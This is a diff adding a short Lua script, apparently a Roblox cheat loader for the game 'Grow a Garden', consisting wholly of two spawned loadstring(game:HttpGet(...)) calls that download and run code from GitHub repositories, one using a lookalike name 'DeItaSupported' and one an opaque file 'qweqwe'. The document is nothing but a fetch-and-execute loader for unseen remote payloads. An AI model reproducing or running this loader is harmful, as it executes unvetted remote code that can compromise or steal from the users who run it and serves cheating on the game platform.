@@ -1,0 +1,9 @@
+loadstring([[
+spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroxScripts/DeItaSupported/refs/heads/main/GrowaGardenLevelTools"))()
+end)
+
+spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroxScripts/bins/refs/heads/main/qweqwe"))()
+end)
+]])()
